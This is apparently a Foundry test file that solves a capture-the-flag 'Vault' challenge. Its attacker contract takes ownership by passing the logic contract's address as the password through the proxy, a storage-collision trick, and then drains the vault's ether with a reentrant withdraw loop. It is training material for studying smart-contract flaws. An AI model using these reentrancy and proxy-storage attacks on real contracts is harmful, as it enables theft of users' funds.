// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

// 攻击合约
contract VaultAttacker {
    Vault public vault;
    address public attacker;

    constructor(Vault _vault) {
        vault = _vault;
        attacker = msg.sender;
    }

    // 接收资金时的回调
    receive() external payable {
        // 如果 Vault 还有余额，继续提款
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    // 执行攻击
    function attack(bytes32 _password) external {
        require(msg.sender == attacker, "not attacker");

        // Step 1: 更改 Vault 的 owner 为本合约
        bytes memory data = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            _password,
            address(this)
        );
        (bool success,) = address(vault).call(data);
        require(success, "changeOwner failed");

        vault.openWithdraw();

        vault.deposite{value: 0.1 ether}();

        vault.withdraw();
    }

    // 提取攻击者资金
    function withdrawFunds() external {
        require(msg.sender == attacker, "not attacker");
        (bool success,) = attacker.call{value: address(this).balance}("");
        require(success, "withdraw failed");
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address player = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(0x3078313233340000000000000000000000000000000000000000000000000000);
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);

        VaultAttacker attacker = new VaultAttacker(vault);

        // 提供初始资金给攻击合约
        (bool success,) = address(attacker).call{value: 0.1 ether}("");
        require(success, "funding attacker failed");

        // 执行攻击，使用logic合约地址作为password
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        attacker.attack(password);

        attacker.withdrawFunds();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}